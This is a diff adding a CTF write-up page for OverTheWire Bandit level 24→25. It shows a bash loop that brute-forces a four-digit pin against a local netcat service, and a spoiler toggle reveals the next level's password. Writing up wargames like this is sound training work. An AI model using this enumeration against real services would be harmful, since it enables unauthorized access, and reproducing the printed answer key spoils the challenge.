@@ -1,0 +1,38 @@
+---
+title: Bandit 24 → 25
+description: "OverTheWire Bandit 24 to 25: brute force a four-digit pin appended to the known password over a socket."
+sidebar:
+  label: "24 → 25"
+  order: 24
+---
+
+import Toggle from '@components/Toggle.astro';
+
+<div class="machine-meta">
+  <span class="meta-badge platform-overthewire">OverTheWire</span>
+  <span class="meta-badge os-linux">Linux</span>
+</div>
+
+> Goal: recover bandit25's password from a service that wants the current password plus an unknown four-digit pin.
+
+## Approach
+
+Generate all 10000 guesses, the known password plus each pin, and pipe them into the port in one connection. Drop the rejections.
+
+```bash frame="code" title="bandit24@bandit"
+bandit24@bandit:~$ for i in {0000..9999}; do echo "<password> $i"; done | nc localhost 30002 | grep -v Wrong
+Correct!
+The password of user bandit25 is <password>
+```
+
+## Why it works
+
+The service checks the current password followed by a four-digit pin, but 10^4 combinations is a tiny keyspace. Sending all 10000 guesses down a single connection lets the server reject the misses (filtered out with grep) and answer the one that fits. Small keyspaces fall to enumeration.
+
+<Toggle label="Reveal password" class="spoiler-toggle">
+
+```text frame="code"
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+</Toggle>
